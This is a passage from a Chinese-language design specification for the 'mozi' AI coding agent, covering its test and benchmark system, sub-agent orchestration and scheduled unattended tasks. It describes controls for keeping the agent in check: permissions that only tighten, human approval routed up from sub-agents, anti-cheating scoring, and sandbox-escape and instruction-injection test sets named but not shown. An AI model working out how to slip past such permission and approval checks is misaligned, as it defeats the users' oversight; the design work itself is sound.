- 安装包：electron-builder 打三平台包在 CI 上冒烟（启动即退）。

---

## M11 测试与评测体系

### 11.1 分层与原则

```
分层（从下到上，成本递增、数量递减）：
  L0 单元：纯函数与单类（PatchEngine、PolicyEngine、Estimator、RiskAnalyzer...）
  L1 集成：ScriptedProvider 驱动的引擎全链路（无真实 API）
  L2 E2E：CLI/桌面在真实文件系统上的完整会话（ScriptedProvider）
  L3 评测：真实模型 × benchmark 任务集（每日 CI，花钱但必要）

原则：
  1. 无真实 API 的测试必须占绝大多数（>95% 的用例）
  2. 每个缺陷修复先补回归用例（TDD 于关键路径）
  3. 事件流断言优先于状态断言（测「发生了什么」而非「现在长什么样」）
```

### 11.2 ScriptedProvider（确定性测试的核心）

```ts
// packages/providers/src/scripted.ts
/**
 * 把「模型响应脚本」按顺序喂给引擎，模拟任意对话轮次。
 * 场景文件格式（.script.json）：
 */
{
  "name": "edit-flow",
  "turns": [
    { "type": "reply", "toolCalls": [{ "name": "read_file", "arguments": { "path": "a.ts" } }] },
    { "type": "reply", "toolCalls": [{ "name": "edit_file", "arguments": { "patch": "*** Begin Patch\n..." } }] },
    { "type": "reply", "content": "修复完成，测试已通过。" },
    { "type": "error", "code": "ERR_MODEL_RATE_LIMIT" }   // 场景可编排错误
  ],
  "options": { "streaming": true, "deltaSize": 8 }        // 可选：切分 delta 模拟分片
}

class ScriptedProvider implements LLMProvider {
  constructor(script: ScenarioFile, hooks?: {
    onReply?: (idx: number) => void;   // 断言某轮回复被消费
    onCall?: (call: ToolCall) => void; // 断言工具入参
  });
}
```

使用模式：

```ts
// 集成测试：完整 loop
const engine = createEngine({ providers: [new ScriptedProvider(script)] });
const events = collect(engine.run({ sessionId: 't1', text: '修复 bug' }));
expect(events).toMatchSnapshot();                          // 事件序列快照
expect(fs.readFileSync(tmp+'/a.ts','utf8')).toContain(...) // 文件系统副作用断言
```

**关键收益**：CI 上秒级跑完整 agent 链路、零 API 成本、确定性可复现、可做 property-based 测试（随机脚本编排）。

### 11.3 各模块测试矩阵

| 模块 | 核心测试 | 方式 |
|------|---------|------|
| M1 引擎 | 状态机全路径（12 类场景：正常/中断/超步/预算/压缩/错误/审批拒绝/审批超时/并发锁/串行调度/读并行/cost 上限） | L1 集成（ScriptedProvider）+ 单元（reducer） |
| M2 事件 | DTO 序列化往返、迁移函数、未知事件跳过 | 单元 |
| M3 工具 | 每工具三明治测试；PatchParser fuzz 1000 例 ≥99%；Matcher 容错用例；截断策略边界 | 单元 + L1 |
| M4 Provider | fixture 回放契约（每家模型）；消息互转无损；JSON 容错对抗语料 | 单元 |
| M5 上下文 | 估算收敛；分层裁剪；Auto-Compact 流程；新鲜度失效 | 单元 + L1 |
| M6 安全 | 规则表驱动；RiskAnalyzer 对抗集；沙箱逃逸矩阵（3 平台 CI）；Workspace 穿越 | 单元 + L1 + 平台 CI |
| M7 会话 | 往返一致；崩溃模拟；fork；GC | 单元 + 子进程 |
| M8 MCP | 双 transport（stdio+Streamable HTTP/SSE 桩）；Tools 注册/diff/热更/取消；Resources 订阅与预算截断；Prompts 命令注入位置断言；Sampling 三档与审批冒泡；Elicitation 频控；OAuth PKCE 桩；崩溃熔断与恢复（全量清单见 M8 §8.15） | L1 |
| M9 TUI | ink-testing-library 组件；键映射 | 单元 + L2 |
| M10 桌面 | IPC 契约；Playwright E2E（ScriptedProvider 模式） | L2 |
| 跨层 | 事件协议：CLI 与桌面消费同一事件流的一致性断言 | L2 |
| M12 子智能体 | 多会话脚本分派；并发槽/深度限制；权限收紧不变式；审批冒泡路由；级联取消；摘要截断；崩溃隔离；并发 patch 冲突（全量清单见 M12 §12.13） | L1（ScriptedProvider 多会话） |
| M13 定时任务 | 调度求解器穷举（cron/DST/时区/once）；tick 主循环（TestClock）；无人值守 ask→deny 不变式（I1）与 full→L3 校验（I4）；worktree 产物流程；三层锁并发实测；headless 执行链路；webhook 通知桩（全量清单见 M13 §13.11） | 单元 + L1 + 子进程 E2E |
| M14 移动端/远程 | 三传输适配器契约一致；配对全链路桩（过期/单次/暴力锁定）；分级审批矩阵；coalescing 时序；断线续传（lastEventId 不丢不重）；中继 E2E 无明文断言；推送零内容断言；幂等重放；Detox 冒烟（全量清单见 M14 §14.12） | 单元 + L1 + 双进程 E2E |
| M15 提示词 | 组装快照（各配置组合）；预算裁剪序；CI 门禁自测（劣化变体触发阻断）；AGENTS.md 越权指令对抗样例 | 单元 + 评测 |
| M16 记忆 | 三写入路径 + 去重/矛盾覆盖/LRU；向量与 BM25 检索；注入预算；untrusted 标注与敏感拒写；多会话连续性评测 | 单元 + L1 + 评测 |
| M17 多模态 | 管线（格式/缩放/OCR 降级/能力协商拒绝）；screenshot 三平台桩 + browser 截图字节断言；Token 计费对账；多模态评测任务组 | 单元 + L1 + 评测 |
| M18 Hooks | 退出码×事件×onExit 矩阵；超时/崩溃/自动禁用；项目级防投毒三不变式；note 注入链路；恶意仓库 fixture E2E | 单元 + L1 + E2E |

**平台 CI 矩阵**：`ubuntu-latest / macos-latest / windows-latest` 三平台跑 L0/L1 + 平台专项（沙箱 L2、路径分隔符、shell 兼容）。

### 11.4 评测集（benchmark/）

```
benchmark/
├── tasks/
│   ├── fix-date-utc/
│   │   ├── setup.sh          # 准备仓库（git init + 生成代码 + 预埋 bug）
│   │   ├── task.md           # 自然语言任务描述（模型输入）
│   │   ├── asserts/
│   │   │   ├── file.ts       # 文件断言（正则/包含/精确）
│   │   │   └── run.sh        # 命令断言（exit 0 + 输出断言）
│   │   └── meta.json         # { level, estCost, requires, skipWindows }
│   └── ...
├── runner/
│   ├── index.ts              # 并发执行（每任务：spawn mozi exec，超时 10min）
│   ├── scorer.ts             # 打分与报表
│   └── report.ts             # Markdown 报表 + 趋势
└── models.json               # 要评测的模型矩阵
```

**打分规则**：
- 满分 1.0：file 断言 + run.sh 断言全过；
- 0.7：file 断言过、run.sh 过但耗时 > 3 倍基线；
- 0.3：仅 file 断言过（部分完成）；
- 0：失败 / 超时 / 误改其他文件（diff 越界 -0.3 分，防「删掉整个仓库」式作弊）。

**报表输出（每任务 × 每模型）**：成功率、平均步数、平均 token、平均成本、审批次数、失败原因分类（Top：patch 失败 / 命令失败 / 上下文断裂 / 模型跑偏）。

**防作弊与校准**：
- 任务仓库固定 commit（git 校验和），setup.sh 幂等；
- 评测用**独立 workspace**（每次全新副本），杜绝上次运行残留；
- 官方基准分由 CI 每日凌晨跑（低峰成本），结果提交到 `benchmark/results/<date>.json`，网站展示趋势图。

### 11.5 CI 流水线（GitHub Actions）

```
ci.yml（PR 触发）：
  lint（biome）→ test（vitest，三平台并行）→ coverage（≥90% 强制）→
  build（turbo）→ dependency-cruiser → 安全扫描（npm audit）

eval.yml（定时 每日 02:00 UTC + 手动触发）：
  - 安装依赖 → 构建 → benchmark runner（DeepSeek 为主模型）→ 结果上传 artifact + 发布报表

release.yml（tag 触发）：
  changesets → 构建 → npm publish（packages）→ electron-builder 三平台 → GitHub Release
```

### 11.6 覆盖率口径

- 强制阈值：`packages/core` 与 `packages/tools` 行覆盖 ≥ 90%；其余包 ≥ 80%；
- 覆盖率**不统计** provider 真实 API 分支（fixture 回放已覆盖）；统计报告进 CI artifact；
- 新增模块的测试必须在其合并 PR 内一并提交（CI 强制：无测试文件不合并）。

---

## M12 子智能体编排（SubAgent Orchestration）

### 12.1 目标与定位

**职责**：让主 Agent 把子任务委派给隔离运行的子 Agent，实现三种核心价值：

| 价值 | 场景示例 | 无子 Agent 时的痛点 |
|------|---------|-------------------|
| **上下文隔离**（最核心） | 大范围代码调研：「找到全仓库所有鉴权相关代码并总结」 | 主上下文被 30k+ token 的搜索过程撑爆，压缩后细节丢失 |
| **并行加速** | 同时调研 3 个模块 / 同时跑 2 个独立修复 | 串行执行，总时长 = 各任务之和 |
| **专门化** | 只读 explore agent、测试补全 agent、review agent | 主 agent 的单一系统提示难以角色化 |

**与竞品对照**：

| 产品 | 子 Agent 能力 | mozi 对齐情况 |
|------|-------------|--------------|
| Claude Code | Task tool + agent 模板文件（.claude/agents/*.md） | **完全对齐** + 开放事件协议（子会话可视） |
| Codex CLI（开源版） | 无内置 subagent（cloud 版有并行任务） | **超越** |
| Gemini CLI | 无 | **超越** |

**边界（不做）**：
- 不做跨进程/跨机器子 Agent（v1 同进程嵌套运行，网络分布式留待协议层演进）；
- 不做子 Agent 之间的直接通信（只能经主 Agent 中转——避免分布式死锁）；
- 不做人肉介入子 Agent 对话（子 Agent 对用户不可交互，审批冒泡是唯一例外）。

### 12.2 总体架构：Supervisor 模式（复用而非新建）

**核心决策：子 Agent 就是 `AgentEngine.run()` 的另一次调用，不引入第二套引擎。**

```
AgentEngine（同一实例）
  │
  ├─ session A（主会话，用户可见）
  │    step 3: tool_call task({agent:'explore', prompt:'...'})
  │              │
  │              ▼
  │    SubAgentSupervisor.spawn()          ← M12 新增组件（引擎内嵌）
  │      ├─ 模板解析：explore → readonly / read 工具集 / 32k 预算
  │      ├─ 子会话合成：session A/sub-1（独立 SessionState、独立 ContextManager）
  │      ├─ 权限合成：child = parent ∩ template（单调收紧，见 12.6）
  │      ├─ engine.run(subSession)          ← 嵌套调用，session 锁独立
  │      │     └─ 子事件全量写 subs/sub-1/events.jsonl（M7）
  │      │        progress 低频桥接回父事件流（subagent.progress）
  │      │        子审批冒泡到父事件流（subagent.approval.required）
  │      └─ 结束：最后一条 assistant 消息 → 结构化摘要 → ToolResult 回父
  │
  └─ session B（另一并行主会话，桌面多会话，与子 Agent 互不干扰）
```

**为什么同进程嵌套（而非 spawn 子进程）**：

| 维度 | 同进程嵌套（选定） | 子进程 |
|------|------------------|--------|
| 工具/Provider 复用 | 直接共享 Registry | 需 IPC 序列化全部工具调用 |
| 审批冒泡 | 事件流直连 | 跨进程事件路由 |
| 内存开销 | 每子会话 < 5MB（状态 + 上下文） | 每进程 ~80MB（Node 基础开销） |
| 崩溃隔离 | 无（子 Agent 抛错被 Supervisor 捕获为 ToolResult） | 有 |
| 结论 | Agent 任务是 IO 密集（等 LLM/等文件），非 CPU 密集，单进程事件循环足够；崩溃风险由错误隔离兜底 | 过度设计 |

### 12.3 子智能体模板（AgentTemplate）

```ts
// packages/core/src/subagent/templates.ts
export interface AgentTemplate {
  type: string;                    // 'explore' | 'general' | 自定义名
  description: string;             // 给主模型看：何时该派这个 agent（进 task 工具描述）
  systemPrompt: string;            // 子 Agent 的角色化系统提示
  policy: PolicyMode;              // 策略上限（与父合成时取更严者）
  allowedTools: string[] | '*';    // 工具白名单
  allowSubAgents: boolean;         // 是否允许该模板再 spawn（默认 false）
  maxSteps: number;                // 步数上限（独立于主会话）
  contextBudgetTokens: number;     // 独立上下文预算
  timeoutMs: number;               // 独立超时
}
```

**内置模板**（开箱即用）：

| 模板 | policy | 工具 | 预算 | 步数 | 要点 |
|------|--------|------|------|------|------|
| `explore` | readonly | read_file / glob / grep / list_dir | 32k | 30 | 只调研不改码；系统提示强制「结论必须是结构化摘要 + 文件:行号 引用」 |
| `general` | 继承父（取严） | *（含 task，受深度限制） | 64k | 50 | 通用委派 |
| `reviewer` | readonly | read_file / glob / grep | 32k | 20 | 代码审查角色，输出问题清单（severity/file/line/suggestion） |

**自定义模板加载**（对齐 Claude Code 的 agents 目录约定，且做兼容）：

```
<workspace>/.mozi/agents/*.md     ← mozi 原生
<workspace>/.claude/agents/*.md   ← 兼容读取（frontmatter 含 tools/policy 字段即转模板）
~/.mozi/agents/*.md               ← 用户全局
```

md 文件格式（frontmatter + 正文即 systemPrompt）：

```markdown
---
type: db-migration
description: 数据库 schema 迁移专家，熟悉本项目 ORM 约定
policy: auto
tools: [read_file, edit_file, shell, grep]
budget: 48k
---
你是本项目的数据库迁移专家。规则：
1. 迁移文件必须放 db/migrations/，命名 V<n>__desc.sql
2. 先读 db/migrations/ 最新版本确定序号
...
```

### 12.4 task 工具契约（M3 工具集新增）

```
名称：task  |  riskLevel: meta（自身不产生副作用，内部执行受子策略管控）

parameters:
{
  agent: string;        // 模板名：'explore' | 'general' | 'reviewer' | 自定义
  prompt: string;       // 子任务指令（必须自包含！）
  contextFiles?: string[];  // 可选：把指定文件内容预注入子 Agent 首条消息
  timeoutMs?: number;       // 覆盖模板超时（上限 600_000）
}

result.content 格式（回填给主模型，~200-500 token）：
<subagent type="explore" prompt="找到全仓库所有鉴权相关代码">
## 结论
- 鉴权核心在 src/auth/：jwt.ts（签发/校验）、guard.ts（路由守卫）
- 中间件链：request → logger → authGuard → handler
## 相关文件
- src/auth/jwt.ts:42  token 校验逻辑（疑似 exp 判断缺陷）
- src/auth/guard.ts:17  路由守卫注册表
## 建议
- 修复点大概率在 jwt.ts:42，建议先 read_file 确认
</subagent>
[usage: steps=12, tokens=8.4k, duration=45s, cost=$0.01]

display: { kind:'markdown', text: 同上 }（UI 折叠卡片，可展开查看子会话全程）
meta: { subSessionId, truncated: false }
```

**工具描述词**（写给主模型，进 task 的 description）：

```
task：派发子智能体执行子任务，子智能体在独立上下文中工作，只把结论返回给你。
何时使用：
  1. 需要大范围阅读/搜索代码但你只需要结论（用 explore）——保护你自己的上下文
  2. 多个相互独立的子任务（可连续发起多个 task，引擎会并行执行）
  3. 需要专门角色（reviewer 审查、自定义模板）
何时不用：
  - 简单的读一个文件/grep 一把（直接用 read_file/grep 更快）
  - 子任务依赖你当前对话的中间推理（子智能体看不到）
规则：
  - prompt 必须自包含：子智能体只能看到你的 prompt + 工作区，看不到本对话历史
  - 明确要求子智能体返回「结论 + 相关文件:行号」结构化摘要
  - 子智能体为只读角色（explore/reviewer）时，改文件需求请回到主任务自己做
```

### 12.5 并发与深度控制

```ts
// packages/core/src/subagent/supervisor.ts
export interface SubAgentConfig {
  maxConcurrent: number;   // 全局同时运行子 Agent 上限（默认 3；超出排队）
  maxDepth: number;        // 嵌套深度上限（默认 2：主 → sub → sub-sub；防递归失控）
  maxPerTurn: number;      // 单个 turn 内 spawn 总数上限（默认 8）
  defaultTimeoutMs: number;// 默认 300_000
}

export class SubAgentSupervisor {
  private semaphore: Semaphore;        // 并发槽（FIFO 排队）
  private active = new Map<string, SubRunHandle>();  // subSessionId → handle

  async spawn(parent: SessionState, spec: SubAgentSpec, parentSignal: AbortSignal): AsyncIterable<AgentEvent> /* 外层聚合后返回 ToolResult */ {
    // ── 校验链（任一失败 → 直接返回 isError ToolResult，不抛异常） ──
    if (parent.depth + 1 > this.config.maxDepth)
      return fail(`已达最大子智能体深度 ${maxDepth}（防递归失控），请在当前上下文直接执行`);
    if (parent.subSpawnCount >= this.config.maxPerTurn)
      return fail('本轮子智能体派发数已达上限');
    const template = this.templates.resolve(spec.agent);   // 未知模板 → fail 列出可用模板

    // ── 槽位（排队而非拒绝：等待时发 progress 事件） ──
    await this.semaphore.acquire(parentSignal);

    // ── 子会话合成 ──
    const subSession = this.sessions.createSub(parent, {
      template, spec,
      policy: tighten(parent.effectivePolicy, template.policy),   // 见 12.6
      tools:  intersectTools(parent.enabledTools, template.allowedTools),
    });

    // ── 级联取消：父 abort → 子 abort ──
    const cascade = new AbortController();
    parentSignal.addEventListener('abort', () => cascade.abort('parent_interrupted'));

    try {
      // ── 嵌套运行（同一 engine 实例；session 锁按 sessionId 独立，无死锁） ──
      const events = this.engine.run({ sessionId: subSession.id, text: spec.prompt, signal: cascade.signal });
      for await (const ev of events) {
        this.forwardProgress(parent, ev);      // 低频桥接（12.8）
        this.bubbleApproval(parent, ev);       // 审批冒泡（12.7）
        subSession.log.append(ev);             // 全量写子日志（M7）
      }
      return this.summarize(subSession);       // 摘要回传（12.9）
    } finally {
      this.semaphore.release();
      this.active.delete(subSession.id);
    }
  }
}
```

**并发语义细则**：

- 主模型一次回复里发多个 `task` 调用 → 引擎调度器（M1 §1.6）将 task 归入**读并行组**（task 本身 meta 级，但为资源安全按并发槽控制）；多子 Agent 真并行（各自独立 LLM 流）；
- 排队时向主事件流发 `subagent.queued`（UI 显示「第 2 位排队」）；
- **深度计算**：`session.depth` 存于 SessionState；主会话 depth=0；maxDepth=2 意味着 sub-sub 可存在但不可再派；
- **防孤儿**：Supervisor 退出（父 turn 结束/崩溃）时对全部 active 子 run 调用 `abort('orphaned')`。

### 12.6 权限继承：单调收紧（Monotonic Tightening）

子 Agent 权限**只能比父严、不能比父松**——这是安全不变式，由 PolicyEngine 在子会话评估时强制执行：

```
合成算法（tighten）：
  effectivePolicy(child) = min(parent.effectivePolicy, template.policy)
    其中严格序：readonly < auto < full-auto（min = 取更严）

  工具集(child) = parent.enabledTools ∩ template.allowedTools

  deny 规则：父会话配置的全部 deny 规则原样继承（deny 不可被任何层级覆盖，M6 已保证）

不变式验证（CI 强制测试）：
  ∀ 子工具调用 c: policyDecision(c, child) 的许可度 ≤ policyDecision(c, parent)
```

典型组合：

| 父模式 | 模板 | 子有效模式 | 说明 |
|--------|------|-----------|------|
| auto | explore | **readonly** | 模板更严，生效 |
| full-auto | explore | **readonly** | full-auto 也无法让子 Agent 拿到写权限 |
| full-auto | general | auto（取严，full-auto 要求沙箱 ≥L2，子继承沙箱等级） | general 声明 auto |
| readonly | general | **readonly** | 父更严，生效——read 会话里派不出写子 Agent |

**沙箱继承**：子 shell 命令执行在**与父相同的沙箱等级**下运行（沙箱等级不参与收紧——L2/L3 是能力不是权限，收紧无意义）。

### 12.7 审批冒泡（Approval Bubbling）

子 Agent 不可与用户直接交互，但其 `ask` 级决策必须由人做。机制：

```
子引擎 executeTool 遇到 ask
  → 子会话产生 tool.approval.required
  → Supervisor 拦截：包装为 subagent.approval.required 转发到父事件流：
     { type:'subagent.approval.required',
       subSessionId, callId,
       agentType: 'general',
       call: ToolCall, reason: ApprovalReason }

UI（M9/M10）渲染父事件流中的这张卡片：
┌──────────────────────────────────────────┐
│ ⚠ [子智能体 general] 请求执行命令          │
│ $ npm install --save-dev vitest           │
│ [y] 允许  [A] 本子会话内允许  [n] 拒绝     │
└──────────────────────────────────────────┘

用户按键 → UI 调 resolveApproval(父sessionId, 子callId)
  → 引擎路由：callId 前缀匹配到 subSession → 转发给子 engine 的 pendingApprovals

超时：10 分钟无应答 → 子审批自动 deny（同 M6 §6.1.3）
"A 本子会话内允许"的作用域：仅该 subSessionId 内同 hash(command) 幂等放行
——不污染父会话与兄弟子会话
```

**设计权衡**：冒泡期间子 Agent 阻塞等待（不跳过该工具继续跑）——保证顺序确定性；若用户 deny，子 Agent 收到拒绝结果可自纠（改用不需要审批的路径）。

### 12.8 事件桥接（低频 progress）

子事件**不**全量转发到父事件流（否则父 UI 被 3 个并行子 Agent 的输出刷屏，且事件量 ×N 放大）。桥接规则：

| 子事件 | 处理 |
|--------|------|
| message.delta / message.completed | **不转发**（只写子日志） |
| tool.requested / started / completed | **不转发**（只写子日志） |
| 每个 step 结束 | 聚合为 `subagent.progress`（每 step 1 条，含 step/totalSteps/currentToolName）转发父流 |
| tool.approval.required | 包装为 `subagent.approval.required` 转发（12.7） |
| task.completed / error | 聚合为 `subagent.completed` / `subagent.failed` 转发 |

```ts
// M2 事件全集新增（v1.1）
| { type: 'subagent.started';   subSessionId: string; parentSessionId: string;
    agentType: string; prompt: string; ts: string }
| { type: 'subagent.queued';    subSessionId: string; queuePosition: number; ts: string }
| { type: 'subagent.progress';  subSessionId: string; step: number; maxSteps: number;
    currentTool?: string; tokensUsed: number; ts: string }
| { type: 'subagent.approval.required'; subSessionId: string; callId: string;
    agentType: string; call: ToolCall; reason: ApprovalReason; ts: string }
| { type: 'subagent.completed'; subSessionId: string; summary: string;
    usage: TokenUsage; steps: number; durationMs: number; ts: string }
| { type: 'subagent.failed';    subSessionId: string; error: AgentError; ts: string }
```

父事件日志因此只增加 ~N×步数 条 progress（低频），子日志承载全部细节——**主会话事件文件不被子 Agent 膨胀**。

### 12.9 上下文策略与摘要回传（核心价值实现）

```
子 Agent 上下文（独立 ContextManager 实例）：
  预算 = template.contextBudgetTokens（默认 explore 32k / general 64k）
  分层与 M5 相同（P0 系统提示 = 模板 systemPrompt；P1 AGENTS.md 同工作区注入）
  Auto-Compact：独立启用（阈值同 M5，压缩只影响子上下文）

首条消息组装：
  [system] template.systemPrompt + 工作区路径 + （spec.contextFiles 的文件内容，各截断 2k）
  [user]   spec.prompt

结束时的摘要强制（防「干完活不说结论」）：
  预算/步数耗尽前的最后一步，Supervisor 注入收尾指令：
  「任务即将结束。请输出最终结构化摘要：## 结论 / ## 相关文件（file:line）/ ## 建议。
    该摘要是你唯一能传回主任务的产物，遗漏即丢失。」
  子 Agent 的最后一条 assistant 消息即 ToolResult.content。

摘要截断：回传内容 > 4k token 时截断保留「结论 + 相关文件」段（建议段优先丢弃），
          meta.truncated=true 提示主模型可读子日志（mozi sub show <subSessionId>）。
```

**成本账**（为什么这是核心价值）：一次 12 步的代码调研，子 Agent 内部消耗 8-30k token；主上下文只增加 ~300 token 的摘要。若不用子 Agent，同样调研会把主上下文灌满并触发压缩，丢失细节且压缩本身又花 token。

### 12.10 持久化与父子关系（M7 扩展）

```
~/.mozi/sessions/<parentSessionId>/
├── events.jsonl                  # 父事件（含 subagent.* 桥接事件）
├── meta.json
├── snapshots/
└── subs/
    ├── sub-1/
    │   ├── events.jsonl          # 子事件全量（独立 SessionStore 布局）
    │   └── meta.json             # { parentSessionId, agentType, prompt, status, usageTotal }
    └── sub-2/...

规则：
- 子会话目录随父创建（lazy：首个子 Agent spawn 时建 subs/）
- resume 父会话：不自动重放子会话；子会话状态从父事件流的 subagent.completed 还原摘要即可
  （用户/主模型需要细节时再按需重放 subs/<id>/events.jsonl）
- fork 父会话：不复制子会话目录；新会话的 subs/ 从空开始（fork 点之后 spawn 的新子 Agent 归新会话）
- GC：子会话目录生命周期与父一致（父删除 → 子删除）；`mozi sub list <parent>` / `mozi sub show <subId>` 查询命令
- meta.json 新增字段：subCount、lastSubSessionId
```

### 12.11 UI 呈现

**CLI（M9 扩展）**：

```
消息流内子 Agent 卡片（折叠单行）：
  ◐ sub-1 [explore] 搜索鉴权相关代码… step 8/30 · 5.2k tok   ← 运行中（◐ 旋转）
  ● sub-2 [general] 修复 utils 测试… 排队中（第 1 位）
  ✔ sub-1 [explore] 完成 · 45s · 摘要 3 条结论                  ← 完成后折叠为结果卡
  ✗ sub-2 [general] 失败：ERR_TOOL_TIMEOUT                     ← 失败标红

快捷键：Ctrl+G 展开当前子 Agent 的实时输出尾部（最后 20 行，只读）
命令：/subs 列出本会话全部子智能体；/sub show <id> 查看某子会话完整重放
```

**桌面（M10 扩展）**：

```
会话视图新增「子智能体」侧面板：
  树视图：主任务 → sub-1 (explore ✔) / sub-2 (general ◐)
  点击节点 → 右侧加载该子会话完整对话（从 subs/<id>/events.jsonl 重放渲染）
  并发运行时：多个子节点各自显示实时进度环（step/maxSteps）+ token 计
  审批冒泡卡：与普通审批卡同组件，头部加 [子智能体 general] 徽标
```

### 12.12 引擎改动汇总（M1 扩展）

| 改动点 | 内容 |
|--------|------|
| SessionState 新增字段 | `depth: number`、`subSpawnCount: number`、`parentSessionId?: string`、`agentType?: string` |
| `ERR_SESSION_BUSY` 语义 | 按 sessionId 判定（父与子、子与子互不阻塞）——原有语义不变，天然支持嵌套 |
| abort 级联 | `engine.abort(sessionId)` 后：Supervisor 检测该 session 的 active 子 run → 递归 abort；父进程信号 → 全树 abort |
| 工具白名单过滤 | 子会话的 `tools.schemas()` 只返回交集工具（模型不会看到未授权工具，从源头减少无效调用） |
| task 工具注册 | 主会话默认注册；子会话仅当 `template.allowSubAgents && depth+1 < maxDepth` 时注册 |

### 12.13 可测试性（M11 扩展）

- **ScriptedProvider 多会话脚本**：`.script.json` 支持按 sessionId 分派不同脚本（`scenarios: { 'main': [...], '*/sub-*': [...] }`），子 Agent 场景可确定性编排；
- 测试矩阵新增：

| 用例 | 断言 |
|------|------|
| 基本 spawn + 摘要回传 | 父收到 ToolResult（含结构化摘要）；主上下文 token 增量 < 1k |
| 并发 3 子 + 第 4 排队 | queued 事件顺序；semaphore 槽位释放后第 4 启动 |
| 深度限制 | depth=maxDepth 的子 spawn task → 返回 isError 且不创建会话 |
| 权限收紧（full-auto 父 × explore 子改文件） | 子 write_file 被 readonly deny |
| 审批冒泡 | 子 ask → 父事件流出现 subagent.approval.required → resolveApproval 路由正确 |
| 级联取消 | 父 abort → 子流终止 + subagent.failed(parent_interrupted) |
| 摘要截断 | 构造超长子输出 → 截断标记 + 建议段丢弃顺序 |
| 崩溃隔离 | 子 ScriptedProvider 抛错 → 父收到 isError ToolResult，主 loop 继续 |
| 并发写冲突 | 两 general 子同时 patch 同一文件 → 后者 PATCH_MISMATCH（原子性兜底） |

- 评测集新增 L2 任务：「调研三个模块并给出迁移方案」（考察主模型是否会正确委派 explore）。

---

## M13 定时任务与调度（Scheduled Tasks）

### 13.1 目标与价值场景

**职责**：让 mozi 在**无人值守**条件下按时间计划自动执行任务——调度（何时跑）、隔离（在哪跑）、安全（能做什么）、产物（跑完产出什么）、通知（结果送哪里）全链路闭环。

**价值场景**（按频率排序）：

| 场景 | 调度示例 | 产物 |
|------|---------|------|
| 每日代码审查 | `0 9 * * 1-5`（工作日 9 点） | report + 审查报告 |
| 跑测试并自修复 | `0 */4 * * *`（每 4 小时） | branch（修复分支） |
| 依赖漏洞扫描 | `0 6 * * 1`（周一早 6 点） | report + 升级 PR |
| 定时评测（配合 benchmark） | `0 2 * * *` | report |
| 文档同步/周报生成 | `0 18 * * 5`（周五 18 点） | report |
| 一次性延迟任务 | `at 2026-09-12T10:00` | 任意 |

**与竞品对照**：Codex CLI / Claude Code / Gemini CLI 均无内置调度器（Claude Code 有 hooks 但无 cron）。mozi 内置调度是超越点，且复用 MCP 通知生态（webhook）。

**边界（不做）**：
- 不做分布式调度（v1 单机文件锁，无 leader 选举）；
- 不做事件触发（git push / 文件变化触发，留待 v2，接口已预留 `TriggerKind`）；
- 不做秒级精度（tick 粒度 = 1 分钟，cron 5 字段标准）。

### 13.2 总体架构：tick 模式 + 调度后端抽象

**核心决策：OS 只负责「每分钟唤醒 mozi」，cron 求解/任务管理/并发控制全部在 mozi 内部。**

```
┌─ 触发源（二选一，文件锁互斥，可共存） ─────────────────┐
│ ① OS tick（默认）：                                      │
│    Linux/macOS: crontab 单条目 "* * * * * mozi task tick" │
│    Windows:     schtasks 每分钟 "mozi task tick"          │
│ ② mozi daemon（可选，桌面端推荐）：                        │
│    常驻进程 setInterval(60s) tick，实时状态推送 IPC        │
└──────────────────────┬───────────────────────────────┘
                       ▼
              mozi task tick（幂等，每分钟至多一次）
                       │
        ┌──────────────▼───────────────┐
        │ TaskScheduler.tick(now)       │
        │  1. 读 tasks.json（任务清单）   │
        │  2. 对每个 enabled 任务：       │
        │     nextRunAt <= now 且未跑？   │──否──► 跳过
        │  3. 文件锁尝试（overlap 策略）  │
        │  4. spawn: mozi task run <id>  │──子进程隔离执行──┐
        │  5. 更新 state（lastRun 等）    │                 │
        └───────────────────────────────┘                 ▼
                                          ┌─────────────────────────┐
                                          │ mozi task run（headless）│
                                          │ = mozi exec 的任务化封装 │
                                          │  · workspace 隔离(13.6)  │
                                          │  · 无人值守策略(13.5)    │
                                          │  · 完整事件日志(M7)      │
                                          │  · 产物收集 + 通知(13.8) │
                                          └─────────────────────────┘
```

**为什么 tick 模式而非「每任务注册一条 OS 调度」（关键决策）**：

| 维度 | tick 模式（选定） | 每任务 OS 注册 |
|------|----------------|---------------|
| 增删任务 | 改 tasks.json（即时生效） | 需改 crontab/schtasks（易碎、需权限） |
| Windows 复杂 cron | 内部 cron-parser 求解，全支持 | schtasks 不支持任意 cron 表达式 |
| 并发/跳过/补跑策略 | 内部实现（13.7） | 无处安放 |
| OS 依赖面 | 单条 tick 注册（一次性） | N 条注册 |
| 错过补跑（关机期间） | tick 启动时回溯（13.4） | 各 OS 行为不一 |

**SchedulerBackend 接口**（未来可替换）：

```ts
interface SchedulerBackend {
  /** 安装触发源（OS tick 注册 / daemon 启动）；幂等 */
  install(): Promise<void>;
  /** 卸载触发源 */
  uninstall(): Promise<void>;
  /** 自检：触发源是否在位（mozi task doctor） */
  healthCheck(): Promise<{ ok: boolean; detail: string }>;
}
// 实现：OsTickBackend（crontab/schtasks）、DaemonBackend（内嵌 setInterval）
```

**OS 注册细节**：

```
Linux/macOS（crontab）：
  读现有 crontab → 查无 "# mozi-task-tick" 标记 → 追加一行：
  * * * * * <mozi绝对路径> task tick --quiet >> ~/.mozi/logs/tick.log 2>&1 # mozi-task-tick
  （卸载 = 过滤该行后重写 crontab）

Windows（schtasks）：
  schtasks /Create /TN "MoziTaskTick" /TR "\"<mozi绝对路径>\" task tick --quiet"
    /SC MINUTE /MO 1 /F
  （仅当用户交互登录时运行——默认 /RU 当前用户；无最高权限需求）

mozi task doctor：检查注册在位 + 手动触发一次 tick 验证全链路 + 检查 mozi 路径有效
```

### 13.3 任务模型（TaskSpec）

```ts
// packages/core/src/tasks/types.ts
export interface TaskSpec {
  id: string;                      // 'task-<rand8>'（用户可改名）
  name: string;                    // 人类可读：「每日代码审查」
  prompt: string;                  // 任务指令（无人值守 → 必须自包含，同子智能体 prompt 要求）
  workspace: string;               // 目标仓库绝对路径
  schedule: Schedule;
  config: TaskRunConfig;
  notifications?: NotificationConfig;
  enabled: boolean;                // 暂停/启用（不删除）
  createdAt: string;
  /** 运行时状态（引擎维护，非用户配置） */
  state: TaskState;
}

export type Schedule =
  | { kind: 'cron'; expression: string; timeZone?: string }   // 默认系统时区
  | { kind: 'interval'; everyMinutes: number }                // ≥ 10
  | { kind: 'once'; at: string };                             // ISO8601，跑完自动 disable

export interface TaskRunConfig {
  model?: string;                 // 覆盖 executor（如定时任务用便宜模型）
  agentTemplate?: string;         // 复用 M12 模板（reviewer/explore/自定义）作为 headless 会话人格
